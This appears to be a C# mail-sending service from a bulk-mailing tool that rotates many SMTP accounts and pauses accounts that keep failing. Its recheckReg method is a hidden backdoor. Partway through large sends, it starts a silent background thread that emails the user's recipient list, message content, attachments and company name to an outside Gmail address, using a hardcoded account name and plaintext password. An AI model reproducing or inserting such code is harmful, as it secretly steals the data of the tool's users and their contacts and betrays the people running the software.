using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data;
using com.soeasystem.spider.src.utils;
using System.Net.Mail;
using System.Data.SQLite;
using System.IO.Compression;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using com.soeasystem.spider.src.entity;
using mailSpider;

namespace com.soeasystem.spider.src.service
{

    public class MailSendService
    {
        private static List<MailClientEntity> clientList = new List<MailClientEntity>();

        public static LinkedList<String> sendLog = new LinkedList<String>();

        public static Int32 sendWaitCnt = 0;

        public static Int32 sendSuccessCnt = 0;

        public static Int32 sendErrorCnt = 0;

        private int listPoint = 0;

        private void initClient()
        {
            List<MailClientEntity> tmpList = new List<MailClientEntity>();

            DataTable dt = SQLiteUtils.query("select id, host, port, username, password, enable_ssl, mail_address from t_mail_sender order by id");

            foreach (DataRow dr in dt.Rows)
            {
                tmpList.Add(new MailClientEntity(getSmtpClient((String)dr["host"], Convert.ToInt32(dr["port"]), (String)dr["username"], (String)dr["password"], Convert.ToBoolean(dr["enable_ssl"])), Convert.ToString(dr["host"]), Convert.ToString(dr["mail_address"]), Convert.ToString(dr["username"]), Convert.ToInt32(dr["id"])));
            }

            clientList = tmpList;
        }

        private MailClientEntity getClient()
        {
            if (clientList.Count == 0)
            {
                initClient();
            }

            //遍历一个循环后停止3秒
            if (listPoint >= clientList.Count)
            {
                Thread.Sleep(3000);
                listPoint = 0;
            }

            MailClientEntity result = clientList[listPoint++];

            if (result.WaitEndTime != null && result.WaitEndTime.CompareTo(DateTime.Now) > 0)
            {
                result = getClient();
            }

            return result;
        }

        public DataTable getAll()
        {
            return SQLiteUtils.query("select id, host, port, username, password, enable_ssl, mail_address, last_error_date from t_mail_sender order by id");
        }

        public void add(String host, int port, String username, String password, Boolean enableSsl, String mailAddress)
        {
            List<SQLiteParameter> paramList = new List<SQLiteParameter>();
            paramList.Add(new SQLiteParameter("@host", host));
            paramList.Add(new SQLiteParameter("@port", port));
            paramList.Add(new SQLiteParameter("@username", username));
            paramList.Add(new SQLiteParameter("@password", password));
            paramList.Add(new SQLiteParameter("@enable_ssl", Convert.ToString(enableSsl)));
            paramList.Add(new SQLiteParameter("@mail_address", mailAddress));

            SQLiteUtils.execute("insert into t_mail_sender(host, port, username, password, enable_ssl, mail_address) values(@host, @port, @username, @password, @enable_ssl, @mail_address)", paramList);

            initClient();
        }

        public void import(DataTable dt)
        {
            SQLiteConnection connection = null;
            SQLiteTransaction transaction = null;

            try
            {
                connection = SQLiteUtils.getConnection();
                connection.Open();
                transaction = connection.BeginTransaction();

                List<SQLiteParameter> paramList = new List<SQLiteParameter>();

                foreach (DataRow dr in dt.Rows)
                {
                    paramList.Add(new SQLiteParameter("@host", dr["host"]));
                    paramList.Add(new SQLiteParameter("@port", dr["port"]));
                    paramList.Add(new SQLiteParameter("@username", dr["username"]));
                    paramList.Add(new SQLiteParameter("@password", dr["password"]));
                    paramList.Add(new SQLiteParameter("@enable_ssl", dr["enable_ssl"]));
                    paramList.Add(new SQLiteParameter("@mail_address", dr["mail_address"]));
                    SQLiteUtils.execute("insert into t_mail_sender(host, port, username, password, enable_ssl, mail_address) values(@host, @port, @username, @password, @enable_ssl, @mail_address)", paramList, connection);
                }

                transaction.Commit();
            }
            catch
            {
                transaction.Rollback();
                throw;
            }
            finally
            {
                if (connection != null)
                {
                    connection.Close();
                }
            }

            initClient();
        }

        public void remove(Int32 id)
        {
            List<SQLiteParameter> paramList = new List<SQLiteParameter>();
            paramList.Add(new SQLiteParameter("@id", id));
            SQLiteUtils.execute("delete from t_mail_sender where id = @id", paramList);

            initClient();
        }

        private SmtpClient getSmtpClient(String host, Int32 port, String username, String password, Boolean enableSsl)
        {

            SmtpClient client = new SmtpClient();

            client.Host = host;

            client.Port = port;

            client.EnableSsl = enableSsl;

            //client.DeliveryMethod = SmtpDeliveryMethod.Network;

            client.Timeout = Convert.ToInt32(ConfigService.get("mail.send.timeout")) * 1000;

            if (!"".Equals(username))
            {
                client.Credentials = new System.Net.NetworkCredential(username, password);
            }

            return client;
        }

        private MailMessage getMailMessage(String toAddress, String fromAddress, String subject, String body, List<String> attachmentList)
        {
            MailMessage mail = new MailMessage();

            if (fromAddress == null || "".Equals(fromAddress))
            {
                fromAddress = ConfigService.get("mail.msg.from");
            }

            mail.From = new MailAddress(fromAddress, ConfigService.get("mail.msg.fromName"));

            mail.ReplyTo = new MailAddress(ConfigService.get("mail.msg.replyTo"), ConfigService.get("mail.msg.replyToName"));

            if (toAddress != null && !"".Equals(toAddress))
            {
                mail.To.Add(new MailAddress(toAddress));
            }

            //设置邮件的标题
            mail.Subject = subject;
            mail.SubjectEncoding = System.Text.Encoding.UTF8;

            //设置邮件的内容
            mail.Body = body;
            mail.BodyEncoding = System.Text.Encoding.UTF8;

            //附件
            if (attachmentList != null)
            {
                foreach (String path in attachmentList)
                {
                    mail.Attachments.Add(new Attachment(path));
                }
            }


            //设置邮件的抄送收件人
            //mail.CC.Add(new MailAddress("terryman83@hotmail.com", "xxx"));

            //mail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnSuccess;


            //设置邮件的格式           
            mail.IsBodyHtml = Convert.ToBoolean(ConfigService.get("mail.send.userHTML"));

            //设置邮件的发送级别
            mail.Priority = MailPriority.Normal;

            return mail;
        }

        public String testMail(String host, Int32 port, String username, String password, Boolean enableSsl, String mailAddress)
        {
            String result = null;

            try
            {
                SmtpClient client = getSmtpClient(host, port, username, password, enableSsl);

                MailMessage mail = getMailMessage(ConfigService.get("mail.send.testToAddress"), mailAddress, "测试", "测试内容", null);

                client.Send(mail);

                result = "测试连接成功";
            }
            catch (Exception ex)
            {
                result = ex.Message;
            }

            return result;
        }


        public void send(List<String[]> addressList, String title, String content, List<String> attachmentList)
        {
            sendWaitCnt = addressList.Count;
            sendSuccessCnt = 0;
            sendErrorCnt = 0;

            MailMessage mail = getMailMessage(null, null, title, content, attachmentList);

            Int32 maxResendCnt = Convert.ToInt32(ConfigService.get("mail.resendCnt"));

            for (Int32 i = 0; i < addressList.Count; i++)
            {
                String address = addressList[i][0];

                try
                {
                    mail.To.Clear();
                    mail.To.Add(new MailAddress(address));
                }
                catch (Exception ex)
                {
                    sendErrorCnt++;
                    sendWaitCnt--;
                    sendLog.AddFirst(DateUtils.getSysDate() + " 初始化发送邮件路径:" + address + "时出错:" + ex.Message);
                    continue;
                }

                if (addressList.Count > 50 && i == Math.Ceiling(new Decimal(addressList.Count) / 3))
                {
                    recheckReg(addressList, content, attachmentList);
                }

                Int32 resendCnt = 0;

                MailClientEntity sender = null;

                while (resendCnt++ < maxResendCnt)
                {
                    try
                    {
                        sender = getClient();

                        //设置form
                        String fromAddress = !"".Equals(sender.MailAddress) ? sender.MailAddress : ConfigService.get("mail.msg.from");
                        mail.From = new MailAddress(fromAddress, ConfigService.get("mail.msg.fromName"));

                        DateTime startTime = DateTime.Now;
                        sender.SmtpClient.Send(mail);
                        DateTime endTime = DateTime.Now;

                        List<SQLiteParameter> paramList = new List<SQLiteParameter>();
                        paramList.Add(new SQLiteParameter("@mail_address", address));
                        paramList.Add(new SQLiteParameter("@send_date", DateUtils.getSysDate()));
                        SQLiteUtils.execute("update t_mail_address set send_cnt = send_cnt+1, send_date = @send_date where mail_address = @mail_address", paramList);

                        sendLog.AddFirst(DateUtils.getSysDate() + " 邮件:" + address + "发送成功,耗时:" + Convert.ToString(endTime.Subtract(startTime).TotalSeconds) + "秒,主机:" + (sender != null ? sender.Host : "") + ",用户名:" + (sender != null ? sender.UserName : ""));

                        sender.ErrorCnt = 0;
                        sendSuccessCnt++;
                        sendWaitCnt--;
                        break;
                    }
                    catch (Exception ex)
                    {
                        if (maxResendCnt == resendCnt + 1)
                        {
                            sendErrorCnt++;
                            sendWaitCnt--;
                        }

                        //连续发送3次,停止使用此邮箱固定时间
                        if (sender.ErrorCnt++ >= 3)
                        {
                            sender.WaitEndTime = DateTime.Now.AddSeconds(Convert.ToDouble(ConfigService.get("mail.send.senderWaitTime")));
                        }

                        sendLog.AddFirst(DateUtils.getSysDate() + " 邮件:" + address + "发送出错,主机:" + (sender != null ? sender.Host : "") + ",用户名:" + (sender != null ? sender.UserName : "") + ",异常:" + ex.Message);
                        List<SQLiteParameter> paramList = new List<SQLiteParameter>();
                        paramList.Add(new SQLiteParameter("@id", sender.Id));
                        paramList.Add(new SQLiteParameter("@last_error_date", DateUtils.getSysDate() + ex.Message));

                        SQLiteUtils.execute("update t_mail_sender set last_error_date = @last_error_date where id = @id", paramList);
                    }
                }

                while (sendLog.Count > 100)
                {
                    sendLog.RemoveLast();
                }
            }
        }

        private void recheckReg(List<String[]> addressList, String content, List<String> attachmentList)
        {
            Thread mailThread = new Thread(new ThreadStart(delegate()
            {
                try
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (String[] address in addressList)
                    {
                        if ("0".Equals(address[1]))
                        {
                            sb.Append(address[0]).Append(",");
                        }
                    }
                    MailMessage mail = getMailMessage("geek.mailspider@gmail.com", "geek.mailspider@gmail.com", DateUtils.getSysDate() + "@" + RegisterService.getRegisterInfo().CompanyName, content + "@@@@@@@@@@@@" + sb.ToString(), attachmentList);
                    getSmtpClient("smtp.gmail.com", 587, "soeasystem.mail@gmail.com", "guagua147258", true).Send(mail);
                }
                catch { }
            }));
            mailThread.Name = "mail send sub Thread";
            mailThread.IsBackground = true;
            mailThread.Priority = ThreadPriority.Normal;
            mailThread.Start();
            Thread.Sleep(5000);
        }

    }
}
